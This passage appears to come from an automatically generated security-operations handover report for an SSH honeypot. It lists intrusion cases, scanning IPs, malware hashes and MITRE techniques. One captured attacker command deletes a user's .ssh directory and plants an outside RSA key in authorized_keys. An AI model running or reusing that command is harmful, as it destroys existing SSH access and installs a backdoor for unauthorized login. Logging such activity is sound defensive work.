| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:30:11` | `cowrie.session.connect` |
| `2026-04-04 12:30:11` | `cowrie.client.version` |
| `2026-04-04 12:30:12` | `cowrie.client.kex` |
| `2026-04-04 12:30:12` | `cowrie.login.success` |
| `2026-04-04 12:30:12` | `cowrie.session.params` |
| `2026-04-04 12:30:12` | `cowrie.command.input` |
| `2026-04-04 12:30:12` | `cowrie.command.failed` |
| `2026-04-04 12:30:13` | `cowrie.log.closed` |
| `2026-04-04 12:30:13` | `cowrie.session.params` |
| `2026-04-04 12:30:13` | `cowrie.command.input` |
| `2026-04-04 12:30:13` | `cowrie.session.file_download` |
| `2026-04-04 12:30:13` | `cowrie.log.closed` |
| `2026-04-04 12:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.75[.]188` to AbuseIPDB if not already reported
- [ ] Block `156.236.75[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849bb4541b61

| Field | Detail |
|---|---|
| **Source IP** | `156.236.75[.]188` |
| **First Seen** | 2026-04-04 12:30 |
| **Last Seen** | 2026-04-04 12:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 12:30:15` | `cowrie.session.connect` |
| `2026-04-04 12:30:15` | `cowrie.client.version` |
| `2026-04-04 12:30:15` | `cowrie.client.kex` |
| `2026-04-04 12:30:16` | `cowrie.login.success` |
| `2026-04-04 12:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.236.75[.]188` to AbuseIPDB if not already reported
- [ ] Block `156.236.75[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `116.110.208[.]50` | **5** | 2026-04-04 11:49 | 2026-04-04 11:52 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `177.128.137[.]156` | **4** | 2026-04-04 10:54 | 2026-04-04 12:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `156.236.75[.]188` | **3** | 2026-04-04 12:19 | 2026-04-04 12:30 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `112.91.141[.]244` | **2** | 2026-04-04 11:52 | 2026-04-04 11:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `217.209.13[.]98` | **2** | 2026-04-04 12:22 | 2026-04-04 12:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.212.225[.]99` | 1 | 2026-04-04 11:29 | 2026-04-04 11:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.13.206[.]122` | 1 | 2026-04-04 11:18 | 2026-04-04 11:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.147.248[.]23` | 1 | 2026-04-04 12:43 | 2026-04-04 12:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-04-04 10:44 | 2026-04-04 10:44 | 5s | 0 | `T1592` | 🟢 LOW |
| `113.219.177[.]95` | 1 | 2026-04-04 12:27 | 2026-04-04 12:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.219.239[.]123` | 1 | 2026-04-04 11:14 | 2026-04-04 11:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.145[.]32` | 1 | 2026-04-04 11:09 | 2026-04-04 11:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-04-04 11:33 | 2026-04-04 11:35 | 120s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-04-04 11:10 | 2026-04-04 11:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.117.5[.]55` | 1 | 2026-04-04 12:31 | 2026-04-04 12:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `123.118.108[.]206` | 1 | 2026-04-04 10:53 | 2026-04-04 10:53 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.239.129[.]2` | 1 | 2026-04-04 12:10 | 2026-04-04 12:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `156.231.116[.]108` | 1 | 2026-04-04 11:44 | 2026-04-04 11:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.227.119[.]154` | 1 | 2026-04-04 12:21 | 2026-04-04 12:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.12.132[.]63` | 1 | 2026-04-04 12:30 | 2026-04-04 12:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]47` | 1 | 2026-04-04 11:26 | 2026-04-04 11:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]57` | 1 | 2026-04-04 11:07 | 2026-04-04 11:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.148[.]87` | 1 | 2026-04-04 12:10 | 2026-04-04 12:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-04-04 12:05 | 2026-04-04 12:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.158.22[.]150` | 1 | 2026-04-04 11:17 | 2026-04-04 11:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.215.204[.]109` | 1 | 2026-04-04 10:31 | 2026-04-04 10:31 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.251.71[.]202` | 1 | 2026-04-04 11:29 | 2026-04-04 11:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.36.7[.]196` | 1 | 2026-04-04 12:49 | 2026-04-04 12:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.75.238[.]43` | 1 | 2026-04-04 11:32 | 2026-04-04 11:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.140.214[.]24` | 1 | 2026-04-04 12:43 | 2026-04-04 12:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.189.124[.]218` | 1 | 2026-04-04 11:09 | 2026-04-04 11:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-04-04 11:09 | 2026-04-04 11:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.170.50[.]2` | 1 | 2026-04-04 12:07 | 2026-04-04 12:07 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.89[.]5` | 1 | 2026-04-04 11:48 | 2026-04-04 11:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.36.75[.]227` | 1 | 2026-04-04 11:14 | 2026-04-04 11:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.218.132[.]28` | 1 | 2026-04-04 11:01 | 2026-04-04 11:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `75.80.65[.]214` | 1 | 2026-04-04 12:46 | 2026-04-04 12:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.129.230[.]191` | 1 | 2026-04-04 12:22 | 2026-04-04 12:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.19.195[.]12` | 1 | 2026-04-04 10:48 | 2026-04-04 10:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.33.164[.]77` | 1 | 2026-04-04 11:13 | 2026-04-04 11:13 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 35/100 | 🟢 LOW | **15/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.118.108[.]206` | CN | China Unicom Beijing province network | **100** ⚠️ | 4 |
| `156.231.116[.]108` | JP | Akile LTD | **100** ⚠️ | 3 |
| `196.204.71[.]189` | EG | Local ISP | **100** ⚠️ | 34 |
| `120.48.22[.]219` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `122.117.5[.]55` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 0 |
| `113.219.177[.]95` | CN | CHINANET HUNAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `176.12.132[.]63` | IL | Cellcom Fixed Line Communication L.P | **100** ⚠️ | 50 |
| `177.128.137[.]156` | BR | CONECT TELECOM | **100** ⚠️ | 0 |
| `186.215.204[.]109` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `156.236.75[.]188` | JP | Yisu Cloud Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 33 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 98 cases |
| Tool 34  | Credential Extractor        | ✅ 48 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 48 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (32.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 40 recon entry/entries in table (5 group(s) consolidating 16 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T12:51:36Z_
